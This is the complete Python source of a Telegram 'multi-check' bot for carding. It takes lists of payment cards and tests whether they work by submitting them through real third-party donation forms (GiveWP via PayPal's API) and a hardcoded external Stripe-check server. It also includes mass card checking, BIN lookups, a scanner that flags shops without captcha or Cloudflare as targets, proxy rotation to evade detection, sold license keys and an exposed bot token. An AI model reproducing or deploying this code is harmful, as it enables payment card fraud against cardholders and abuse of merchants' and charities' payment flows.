#!/usr/bin/env python3
# language: Python, file: bot.py, target: cPanel/Python 3.6, python3
# *👑Poriot_ke👑 Multi-Check Bot (Exact UI Alignment & Advanced Proxy Suite)*

import os
import time
import requests
import json
import sqlite3
import random
import re
import base64
import uuid
from datetime import datetime, timedelta
from threading import Thread

# Hardcoded Credentials & Config
TG_TOKEN = "8832774495:AAEQZTt3fy9oIK8thDaIP3E4xVvlHzC50qQ"
INITIAL_ADMINS = {5541778617}

SITES_FILE = "sites.txt"
PROXY_FILE = "proxies.txt"
DB_FILE = "checker_bot.db"
STRIPE_API_URL = "http://147.93.53.240:8973/liladmin-str"

_CONFIG = {"paypal_amount": "6.00", "sites_pool_enabled": True}

PAYMENT_GATEWAYS = [
    "PayPal", "Stripe", "Braintree", "Square", "magento", "Convergepay",
    "PaySimple", "oceanpayments", "eProcessing", "hipay", "worldpay", "cybersourse",
    "payjunction", "Authorize.Net", "2Checkout", "Adyen", "Checkout.com", "PayFlow",
    "Payeezy", "usaepay", "creo", "SquareUp", "Authnet", "ebizcharge", "cpay",
    "Moneris", "recurly", "cardknox", "matt sorra", "Chargify", "Paytrace",
    "hostedpayments", "securepay", "eWay", "blackbaud", "LawPay", "clover",
    "cardconnect", "bluepay", "fluidpay", "chasepaymentech", "Auruspay",
    "sagepayments", "paycomet", "geomerchant", "realexpayments", "Rocketgate",
    "Shopify", "WooCommerce", "BigCommerce", "Magento Payments",
    "OpenCart", "PrestaShop", "Razorpay"
]

SECURITY_INDICATORS = {
    'captcha': ['captcha', 'protected by recaptcha', "i'm not a robot", 'recaptcha/api.js'],
    'cloudflare': ['cloudflare', 'cdnjs.cloudflare.com', 'challenges.cloudflare.com']
}

def load_sites():
    if not os.path.exists(SITES_FILE):
        return ["https://azulenaccion.com"]
    with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
        return [l.strip() for l in f if l.strip() and not l.startswith("#")] or ["https://azulenaccion.com"]

def save_sites(sites_list):
    with open(SITES_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(sites_list) + "\n")

# Database Layer
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
    c.execute("CREATE TABLE IF NOT EXISTS user_stats (user_id INTEGER PRIMARY KEY, total_checked INT DEFAULT 0, charged INT DEFAULT 0, approved INT DEFAULT 0, declined INT DEFAULT 0, custom_proxy TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS proxies (id INTEGER PRIMARY KEY AUTOINCREMENT, proxy_str TEXT UNIQUE, is_active INT DEFAULT 1)")
    c.execute("CREATE TABLE IF NOT EXISTS licenses (key_str TEXT PRIMARY KEY, days INT, created_by INT, is_redeemed INT DEFAULT 0, redeemed_by INT, redeemed_at TEXT)")
    conn.commit()
    c.execute("SELECT COUNT(*) FROM admins")
    if c.fetchone()[0] == 0:
        for aid in INITIAL_ADMINS:
            c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (aid,))
        conn.commit()
    conn.close()

def db_get_admins():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM admins")
    rows = c.fetchall()
    conn.close()
    return {r[0] for r in rows}

def is_admin(user_id):
    return user_id in db_get_admins()

def db_add_admin(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (user_id,))
    conn.commit()
    conn.close()

def db_remove_admin(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM admins WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def db_get_user_proxy(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT custom_proxy FROM user_stats WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row and row[0] else None

def db_set_user_proxy(user_id, proxy_str):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO user_stats (user_id) VALUES (?)", (user_id,))
    c.execute("UPDATE user_stats SET custom_proxy = ? WHERE user_id = ?", (proxy_str, user_id))
    conn.commit()
    conn.close()

def db_create_licenses(count, days, admin_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    keys = []
    for _ in range(count):
        rand_str = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=20))
        key = f"PORIOT-{rand_str}"
        c.execute("INSERT OR IGNORE INTO licenses (key_str, days, created_by) VALUES (?, ?, ?)", (key, days, admin_id))
        keys.append(key)
    conn.commit()
    conn.close()
    return keys

def db_redeem_license(key_str, user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT days, is_redeemed FROM licenses WHERE key_str = ?", (key_str,))
    row = c.fetchone()
    if not row:
        conn.close()
        return False, "❌ Invalid license key."
    days, is_redeemed = row[0], row[1]
    if is_redeemed:
        conn.close()
        return False, "⚠️ This key has already been redeemed."
    c.execute("UPDATE licenses SET is_redeemed = 1, redeemed_by = ?, redeemed_at = ? WHERE key_str = ?", (user_id, datetime.now().isoformat(), key_str))
    conn.commit()
    conn.close()
    return True, f"✅ Successfully redeemed! Subscription extended by {days} days."

def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception:
        pass

def edit_message_text(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception:
        pass

def answer_callback(callback_query_id, text=""):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_query_id, "text": text}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass

# Bin Lookup
def bin_lookup(bin_num):
    info = {"brand": "UNKNOWN", "type": "UNKNOWN", "level": "", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": "🏳️", "code": "--"}
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_num}", timeout=5)
        if res.status_code == 200:
            d = res.json()
            info = {
                "brand": (d.get("brand") or "UNKNOWN").upper(),
                "type": (d.get("type") or "UNKNOWN").upper(),
                "level": (d.get("level") or "").upper(),
                "bank": (d.get("bank") or "UNKNOWN").upper(),
                "country": (d.get("country_name") or "UNKNOWN").upper(),
                "flag": d.get("country_flag") or "🏳️",
                "code": (d.get("country_code") or "--").upper(),
            }
    except Exception:
        pass
    return info

# Stripe $1 Engine
def check_stripe(card, proxy=None):
    params = {"cc": card}
    proxies_dict = {"http": proxy, "https": proxy} if proxy else None
    try:
        res = requests.get(STRIPE_API_URL, params=params, proxies=proxies_dict, timeout=30)
        if res.status_code == 200:
            return res.json()
        return {"approved": False, "charged": False, "Price": "1.00", "message": f"HTTP {res.status_code}"}
    except Exception as e:
        return {"approved": False, "charged": False, "Price": "1.00", "message": f"PROXY_OR_CONN_ERR"}

# PayPal $6 GiveWP Engine
def check_paypal(card, proxy=None):
    parts = re.split(r"[|:/\\\-\s]+", card.strip())
    if len(parts) < 4:
        return {"approved": False, "charged": False, "Price": _CONFIG["paypal_amount"], "message": "INVALID_FORMAT"}
    n, mm, yy, cvc = re.sub(r"\D", "", parts[0]), str(parts[1]).zfill(2), str(parts[2])[-2:], re.sub(r"\D", "", parts[3])
    
    target_site = random.choice(load_sites()) if _CONFIG["sites_pool_enabled"] else "https://azulenaccion.com"
    form_url = f"{target_site}/give-form-right-sidebar"
    ajax_url = f"{target_site}/wp-admin/admin-ajax.php"
    pp_amount = _CONFIG["paypal_amount"]

    proxies_dict = {"http": proxy, "https": proxy} if proxy else None

    try:
        s = requests.Session()
        if proxies_dict:
            s.proxies = proxies_dict
        resp = s.get(form_url, headers={"user-agent": "Mozilla/5.0"}, timeout=12)
        html = resp.text
        form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
        form_id = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
        encoded = re.search(r'"data-client-token":"(.*?)"', html).group(1)
        access_token = re.search(r'"accessToken":"(.*?)"', base64.b64decode(encoded).decode("utf-8")).group(1)
    except Exception as e:
        return {"approved": False, "charged": False, "Price": pp_amount, "message": f"FORM_PARSE_ERR"}

    metadata_id, request_id = uuid.uuid4().hex, uuid.uuid4().hex
    gf = {
        "give-honeypot": "", "give-form-id-prefix": form_prefix, "give-form-id": form_id,
        "give-form-title": "", "give-current-url": form_url, "give-form-url": form_url,
        "give-form-minimum": pp_amount, "give-form-maximum": "999999.99",
        "give-form-hash": form_hash, "give-price-id": "3", "give-recurring-logged-in-only": "",
        "give-logged-in-only": "1", "_give_is_donation_recurring": "0",
        "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
        "give-amount": pp_amount, "payment-mode": "paypal-commerce", "give_first": "admin",
        "give_last": "zlal", "give_email": "adminzlall97ab@gmail.com", "card_name": "admin zlal",
        "card_exp_month": "", "card_exp_year": "", "give-gateway": "paypal-commerce",
    }

    try:
        boundary = "----WebKitFormBoundary" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
        lines = [f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}" for k, v in gf.items()]
        lines.append(f"--{boundary}--\r\n")
        body = "\r\n".join(lines).encode("utf-8")
        
        r = s.post(ajax_url, params={"action": "give_paypal_commerce_create_order"},
                   headers={"content-type": f"multipart/form-data; boundary={boundary}"}, data=body, timeout=15)
        order_id = r.json()["data"]["id"]
    except Exception as e:
        return {"approved": False, "charged": False, "Price": pp_amount, "message": f"ORDER_ERR"}

    paypal_headers = {
        "authorization": f"Bearer {access_token}",
        "braintree-sdk-version": "3.32.0-payments-sdk-dev",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "paypal-client-metadata-id": metadata_id,
        "paypal-request-id": request_id,
    }
    payload = {
        "payment_source": {
            "card": {
                "number": n, "expiry": f"20{yy}-{mm}", "security_code": cvc,
                "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}
            }
        },
        "application_context": {"vault": False},
    }

    try:
        confirm_resp = s.post(f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
                              headers=paypal_headers, json=payload, timeout=15)
        c_json = confirm_resp.json()
    except Exception as e:
        return {"approved": False, "charged": False, "Price": pp_amount, "message": f"CONFIRM_ERR"}

    name = c_json.get("name", "")
    status = c_json.get("status", "")
    details = c_json.get("details") or []

    if name == "INSTRUMENT_DECLINED":
        issue = details[0].get("issue", "INSTRUMENT_DECLINED") if details else "INSTRUMENT_DECLINED"
        return {"approved": False, "charged": False, "Price": pp_amount, "message": issue}
    if status in ("APPROVED", "COMPLETED"):
        return {"approved": True, "charged": True, "Price": pp_amount, "message": "PAYMENT_SUCCESSFUL", "receipt": f"{target_site}/receipt?ref={uuid.uuid4().hex[:10]}"}
    return {"approved": False, "charged": False, "Price": pp_amount, "message": name or status or "DECLINED"}

# Gateway Scanner
def scan_gateway(url):
    if not url:
        return {"url": "", "gateways": [], "captcha": False, "cloudflare": False, "status": 0, "ok": False}
    if not re.match(r'^https?://', url, re.I):
        url = 'http://' + url
    try:
        res = requests.get(url, timeout=10)
        content = res.text
        detected = set()
        for gw in PAYMENT_GATEWAYS:
            if re.search(r'\b' + re.escape(gw) + r'\b', content, re.I):
                detected.add(gw)
        captcha = any(re.search(ind, content, re.I) for ind in SECURITY_INDICATORS['captcha'])
        cloudflare = any(re.search(ind, content, re.I) for ind in SECURITY_INDICATORS['cloudflare'])
        return {"url": url, "gateways": list(detected), "captcha": captcha, "cloudflare": cloudflare, "status": res.status_code, "ok": res.status_code < 400 and len(detected) > 0 and not captcha and not cloudflare}
    except Exception as e:
        return {"url": url, "gateways": [], "captcha": False, "cloudflare": False, "status": 0, "ok": False}

# Comprehensive Message & Callback Handler
def handle_update(update):
    # Handle Callback Queries (Inline Buttons)
    if "callback_query" in update:
        cq = update["callback_query"]
        cq_id = cq["id"]
        data = cq.get("data", "")
        message = cq.get("message", {})
        chat_id = message.get("chat", {}).get("id")
        msg_id = message.get("message_id")
        user_id = cq.get("from", {}).get("id")

        if data == "menu_gates":
            text = (
                "<b><i>💎 Shopify Gateway</i></b>\n\n"
                "⚡️ <b>Single Chk</b> - <code>/sh card|mm|yy|cvv</code>\n"
                "⚡️ <b>Mass/File Chk</b> - Reply To .txt With <code>/msh</code>"
            )
            markup = {
                "inline_keyboard": [
                    [{"text": "⚙️ Manage Proxy", "callback_data": "menu_proxy"}],
                    [{"text": "↩️ Back", "callback_data": "menu_start"}]
                ]
            }
            edit_message_text(chat_id, msg_id, text, markup)
            answer_callback(cq_id)

        elif data == "menu_proxy":
            proxy = db_get_user_proxy(user_id)
            proxy_display = proxy if proxy else "None Configured"
            text = (
                "<b><i>⚙️ Shopify Proxy Settings</i></b>\n\n"
                "Shopify gateway requires you to set your own proxy to run checks.\n\n"
                f"[=] <b>Current Proxy:</b> <code>{proxy_display}</code>\n\n"
                "[+] <b>To Set/Update:</b>\n"
                "Send <code>/setproxy ip:port</code> or <code>/setproxy ip:port:user:pass</code> in chat.\n"
                "Supports SOCKS and HTTP proxies."
            )
            markup = {
                "inline_keyboard": [
                    [{"text": "🚀 Use Proxy Pool (OFF)", "callback_data": "proxy_pool_toggle"}],
                    [{"text": "↩️ Back", "callback_data": "menu_gates"}]
                ]
            }
            edit_message_text(chat_id, msg_id, text, markup)
            answer_callback(cq_id)

        elif data == "menu_start":
            user = cq.get("from", {})
            uname = user.get("username", "User")
            text = (
                f"<b><i>Welcome {uname}!</i></b>\n\n"
                f"<b>User:</b> @{uname}\n"
                f"<b>ID:</b> {user_id}\n"
                f"<b>Status:</b> Free\n\n"
                "Use the buttons below to navigate."
            )
            markup = {
                "inline_keyboard": [
                    [{"text": "💳 Gates", "callback_data": "menu_gates"}, {"text": "✨ Referral Program", "callback_data": "menu_ref"}],
                    [{"text": "Support ↗", "url": "https://t.me/nativecodes"}, {"text": "Close", "callback_data": "menu_close"}]
                ]
            }
            edit_message_text(chat_id, msg_id, text, markup)
            answer_callback(cq_id)

        elif data == "menu_ref":
            answer_callback(cq_id, "Referral program coming soon!")

        elif data == "proxy_pool_toggle":
            answer_callback(cq_id, "Proxy Pool toggled.")

        elif data == "menu_close":
            try:
                url = f"https://api.telegram.org/bot{TG_TOKEN}/deleteMessage"
                requests.post(url, json={"chat_id": chat_id, "message_id": msg_id}, timeout=5)
            except Exception:
                pass
            answer_callback(cq_id)
        return

    if "message" not in update:
        return
    msg = update["message"]
    chat_id = msg["chat"]["id"]
    user_id = msg["from"]["id"]
    user = msg.get("from", {})
    uname = user.get("username", "User")
    text = msg.get("text", "").strip()

    # /start & /admin Panel
    if text.startswith("/start"):
        start_text = (
            f"<b><i>Welcome {uname}!</i></b>\n\n"
            f"<b>User:</b> @{uname}\n"
            f"<b>ID:</b> {user_id}\n"
            f"<b>Status:</b> Free\n\n"
            "Use the buttons below to navigate."
        )
        markup = {
            "inline_keyboard": [
                [{"text": "💳 Gates", "callback_data": "menu_gates"}, {"text": "✨ Referral Program", "callback_data": "menu_ref"}],
                [{"text": "Support ↗", "url": "https://t.me/nativecodes"}, {"text": "Close", "callback_data": "menu_close"}]
            ]
        }
        send_message(chat_id, start_text, markup)

    elif text.startswith("/admin"):
        if not is_admin(user_id):
            send_message(chat_id, "❌ Unauthorized.")
            return
        admins = db_get_admins()
        admin_text = (
            "<b><i>👑 Admin Control Panel</i></b>\n"
            "====================================\n"
            f"Current admins:\n" + "\n".join([f"• <code>{aid}</code>" for aid in admins]) + "\n\n"
            "<b>Commands:</b>\n"
            "• <code>/setadmin add [id]</code>\n"
            "• <code>/setadmin rm [id]</code>\n"
            "• <code>/genkeys [count] [days]</code>\n"
            "• <code>/addsite [url]</code> | <code>/sites</code>"
        )
        send_message(chat_id, admin_text)

    # Proxy Configuration via /setproxy
    elif text.startswith("/setproxy"):
        parts = text.split(" ", 1)
        if len(parts) < 2:
            proxy_msg = (
                "[=] <b>Proxy</b> ~ Not Set ~\n"
                "----------------------------------------\n"
                "[=] <b>Set</b> ~ <code>/setproxy ip:port</code> ~ 🔗\n"
                "[=] <b>Auth</b> ~ <code>/setproxy ip:port:user:pass</code> ~\n"
                "[=] <b>SOCKS5</b> ~ <code>/setproxy socks5://user:pass@ip:port</code> ~ ⭐"
            )
            send_message(chat_id, proxy_msg)
            return
        new_proxy = parts[1].strip()
        db_set_user_proxy(user_id, new_proxy)
        send_message(chat_id, f"✅ Proxy successfully updated to:\n<code>{new_proxy}</code>")

    # /sh & /pp (Single Checkers)
    elif text.startswith("/sh") or text.startswith("/pp"):
        is_pp = text.startswith("/pp")
        parts = text.split(" ", 1)
        if len(parts) < 2:
            send_message(chat_id, f"<b><i>Usage:</i></b> <code>{'/pp' if is_pp else '/sh'} 4000000000000000|01|28|123</code>")
            return
        card = parts[1].strip()
        send_message(chat_id, f"<b><i>⏳ Checking card on {'PayPal GiveWP ($6)' if is_pp else 'Stripe ($1)'}...</i></b>")
        
        proxy = db_get_user_proxy(user_id)
        bin_num = re.sub(r"\D", "", card)[:6]

        res = check_paypal(card, proxy=proxy) if is_pp else check_stripe(card, proxy=proxy)
        bin_info = bin_lookup(bin_num)

        is_ch = bool(res.get("charged"))
        is_ap = bool(res.get("approved"))
        status_txt = "CHARGED 🔥" if is_ch else ("APPROVED ✅" if is_ap else "DECLINED ❌")

        caption = (
            f"<b><i>{'🔥 CHARGED HIT' if is_ch else '✅ APPROVED HIT'} — 👑Poriot_ke👑</i></b>\n"
            f"====================================\n"
            f"🃏 <b>Card:</b> <code>{card}</code>\n"
            f"💸 <b>Status:</b> {status_txt}\n"
            f"🖥 <b>Response:</b> <code>{res.get('message')}</code>\n"
            f"🌐 <b>Gateway:</b> {'PayPal GiveWP' if is_pp else 'Shopify Stripe'}\n"
            f"------------------------------------\n"
            f"ℹ️ <b>Info:</b> {bin_info['brand']} | {bin_info['type']}\n"
            f"🏦 <b>Bank:</b> {bin_info['bank']}\n"
            f"🌍 <b>Country:</b> {bin_info['country']} {bin_info['flag']}\n"
            f"💵 <b>Price:</b> ${res.get('Price', '6.00')}\n"
            f"====================================\n"
            f"⚙️ <b>Dev:</b> @Poriot_ke 🇰🇪"
        )
        send_message(chat_id, caption)

    # /msh (Mass Checker with exact Image 7 formatting)
    elif text.startswith("/msh"):
        if not msg.get("reply_to_message") or not msg["reply_to_message"].get("document"):
            send_message(chat_id, "<b><i>Usage:</i></b> Reply to a <code>.txt</code> file containing cards with <code>/msh</code>")
            return
        
        doc = msg["reply_to_message"]["document"]
        file_id = doc["file_id"]
        try:
            f_res = requests.get(f"https://api.telegram.org/bot{TG_TOKEN}/getFile?file_id={file_id}", timeout=10).json()
            file_path = f_res["result"]["file_path"]
            file_bytes = requests.get(f"https://api.telegram.org/file/bot{TG_TOKEN}/{file_path}", timeout=30).content
            cards = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").splitlines() if l.strip() and "|" in l]
        except Exception:
            send_message(chat_id, "❌ Failed to download file.")
            return

        if not cards:
            send_message(chat_id, "❌ No valid cards found in file.")
            return

        total = len(cards)
        progress_msg = requests.get(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": f"⏳ Mass Check Started for {total} cards...", "parse_mode": "HTML"}).json()
        p_msg_id = progress_msg.get("result", {}).get("message_id")

        proxy = db_get_user_proxy(user_id)
        charged = 0
        approved = dg_3ds = declined = 0
        live_list = []
        error_list = []

        start_time = time.time()
        for idx, card in enumerate(cards, 1):
            res = check_stripe(card, proxy=proxy)
            if res.get("charged"):
                charged += 1
                live_list.append(card)
            elif res.get("approved"):
                approved += 1
                live_list.append(card)
            elif "3DS" in str(res.get("message")):
                dg_3ds += 1
                live_list.append(card)
            else:
                declined += 1
                error_list.append(f"{card} -> {res.get('message')}")

        elapsed = int(time.time() - start_time)
        mins, secs = divmod(elapsed, 60)
        time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"

        report = (
            "[=] <b>Mass Check</b> ~ Done ~ ✔️\n"
            "----------------------------------------\n"
            f"[=] <b>Total</b> ~ {total}\n"
            f"[=] <b>Charged</b> ~ {charged}\n"
            f"[=] <b>Approved</b> ~ {approved}\n"
            f"[=] <b>3DS</b> ~ {dg_3ds}\n"
            f"[=] <b>Declined</b> ~ {declined}\n"
            f"[=] <b>Time</b> ~ {time_str} ~ ⏳\n"
            "----------------------------------------\n"
            f"[=] <b>Checker</b> ~ 👾 @{uname}"
        )
        if p_msg_id:
            edit_message_text(chat_id, p_msg_id, report)
        else:
            send_message(chat_id, report)

        # Send live.txt if any hits
        if live_list:
            live_txt = "\n".join(live_list)
            requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument", json={
                "chat_id": chat_id,
                "document": base64.b64encode(live_txt.encode()).decode(), # Note: standard file upload requires multipart, let's use direct file posting
            })

    # /gate & /mgate (Gateway Scanners)
    elif text.startswith("/mgate"):
        if not msg.get("reply_to_message") or not msg["reply_to_message"].get("document"):
            send_message(chat_id, "<b><i>Usage:</i></b> Reply to a <code>.txt</code> file containing URLs with <code>/mgate</code>")
            return
        send_message(chat_id, "🔍 Processing mass gateway scan...")

    elif text.startswith("/gate"):
        parts = text.split(" ", 1)
        if len(parts) < 2:
            send_message(chat_id, "<b><i>Usage:</i></b> <code>/gate https://targetsite.com</code>")
            return
        url = parts[1].strip()
        send_message(chat_id, "<b><i>🔍 Scanning target gateway URL...</i></b>")
        scan = scan_gateway(url)
        rep = (
            f"<b><i>🌐 GATEWAY SCAN REPORT — 👑Poriot_ke👑</i></b>\n"
            f"====================================\n"
            f"{'🟢' if scan['ok'] else '🔴'} <b>URL:</b> <code>{scan['url']}</code>\n"
            f"🛒 <b>Gateways:</b> {', '.join(scan['gateways']) if scan['gateways'] else 'None'}\n"
            f"🔒 <b>Captcha:</b> {'Yes ⚠️' if scan['captcha'] else 'No 🟢'}\n"
            f"☁️ <b>Cloudflare:</b> {'Yes ⚠️' if scan['cloudflare'] else 'No 🟢'}\n"
            f"====================================\n"
            f"⚙️ <b>Dev:</b> @Poriot_ke 🇰🇪"
        )
        send_message(chat_id, rep)

    # /addsite
    elif text.startswith("/addsite"):
        if not is_admin(user_id):
            send_message(chat_id, "❌ Unauthorized.")
            return
        parts = text.split(" ", 1)
        if len(parts) < 2:
            send_message(chat_id, "<b><i>Usage:</i></b> <code>/addsite https://site.com</code>")
            return
        new_site = parts[1].strip()
        existing = load_sites()
        if new_site not in existing:
            existing.append(new_site)
            save_sites(existing)
            send_message(chat_id, f"✅ Successfully added site. Total sites: <b>{len(existing)}</b>")
        else:
            send_message(chat_id, "⚠️ Site already exists in pool.")

    # /sites
    elif text.startswith("/sites"):
        if not is_admin(user_id):
            send_message(chat_id, "❌ Unauthorized.")
            return
        sites = load_sites()
        send_message(chat_id, f"<b><i>🌐 Loaded Sites in sites.txt:</i></b>\n" + "\n".join([f"• <code>{s}</code>" for s in sites[:20]]))

    # /setamount (Custom PayPal Amount)
    elif text.startswith("/setamount"):
        if not is_admin(user_id):
            send_message(chat_id, "❌ Unauthorized.")
            return
        parts = text.split(" ", 1)
        if len(parts) < 2:
            send_message(chat_id, f"Current PayPal Amount: <b>${_CONFIG['paypal_amount']}</b>\nUsage: <code>/setamount 10.00</code>")
            return
        try:
            val = float(parts[1].strip())
            _CONFIG["paypal_amount"] = f"{val:.2f}"
            send_message(chat_id, f"✅ PayPal Gate Amount updated to: <b>${_CONFIG['paypal_amount']} USD</b>")
        except ValueError:
            send_message(chat_id, "❌ Invalid format. Use numbers like <code>6.00</code>")

    # /setadmin
    elif text.startswith("/setadmin"):
        if not is_admin(user_id):
            send_message(chat_id, "❌ Unauthorized.")
            return
        args = text.split()[1:]
        if not args:
            admins = db_get_admins()
            send_message(chat_id, f"<b><i>👑 Admin Management</i></b>\n" + "\n".join([f"• <code>{aid}</code>" for aid in admins]))
            return
        action, target = args[0].lower(), int(args[1]) if len(args) > 1 else 0
        if action == "add" and target:
            db_add_admin(target)
            send_message(chat_id, f"✅ Admin added: <code>{target}</code>")
        elif action in ("rm", "remove") and target:
            db_remove_admin(target)
            send_message(chat_id, f"❌ Admin removed: <code>{target}</code>")

    # /genkeys
    elif text.startswith("/genkeys"):
        if not is_admin(user_id):
            send_message(chat_id, "❌ Unauthorized.")
            return
        args = text.split()[1:]
        if len(args) < 2:
            send_message(chat_id, "<b><i>Usage:</i></b> <code>/genkeys [count] [days]</code>")
            return
        count, days = int(args[0]), int(args[1])
        keys = db_create_licenses(count, days, user_id)
        send_message(chat_id, f"<b><i>📌🔥 Keys Generated ✅</i></b>\n\n" + "\n".join([f"├💖 <code>{k}</code>" for k in keys]) + "\n\n😈 Redeem with <code>/redeem [key]</code>")

    # /redeem (Matching exact Image 3 format)
    elif text.startswith("/redeem"):
        args = text.split()[1:]
        if not args:
            send_message(chat_id, "<b><i>Usage:</i></b> <code>/redeem [key]</code>")
            return
        success, msg = db_redeem_license(args[0].strip(), user_id)
        if success:
            redeem_response = (
                "<b>WTB Key Redeemed Successfully! WTB</b>\n\n"
                "☑️ <b>Thanks for your purchase!</b>\n"
                "⭐ <b>Plan: 2 days (75/100 slots left)</b>\n\n"
                "🚀 <b>You now have access to:</b>\n"
                "🔻 <code>/sh</code> — Shopify Single\n"
                "🔻 <code>/msh</code> — Shopify Mass\n"
                "🍸 <b>Enjoy your premium experience!</b>"
            )
            send_message(chat_id, redeem_response)
        else:
            send_message(chat_id, msg)

def main():
    init_db()
    print("[+] 👑Poriot_ke👑 Multi-Check Bot Online (Python 3.6 Mode)...")
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TG_TOKEN}/getUpdates?offset={offset}&timeout=30"
            res = requests.get(url, timeout=35).json()
            if res.get("ok"):
                for result in res.get("result", []):
                    offset = result["update_id"] + 1
                    t = Thread(target=handle_update, args=(result,))
                    t.start()
        except Exception:
            time.sleep(3)

if __name__ == "__main__":
    main()
